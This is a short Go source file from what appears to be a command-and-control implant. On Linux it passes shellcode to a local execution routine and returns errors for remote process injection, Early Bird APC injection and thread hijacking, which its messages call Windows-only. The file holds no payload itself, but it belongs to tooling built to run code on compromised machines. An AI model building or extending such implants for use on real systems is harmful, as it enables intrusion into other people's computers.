//go:build linux

package implant

import "fmt"

func executeShellcodeCrossPlatform(shellcode []byte) error {
	return ExecuteShellcodeLinux(shellcode)
}

func injectShellcodeRemoteCrossPlatform(pid uint32, shellcode []byte) error {
	return fmt.Errorf("remote process injection on Linux requires ptrace — use memfd BOF instead")
}

func injectEarlyBirdCrossPlatform(shellcode []byte) error {
	return fmt.Errorf("Early Bird APC injection is Windows-only")
}

func injectThreadHijackCrossPlatform(shellcode []byte) error {
	return fmt.Errorf("thread hijacking is Windows-only")
}

func injectThreadHijackEnumCrossPlatform(processName string, shellcode []byte) error {
	return fmt.Errorf("thread hijacking is Windows-only")
}
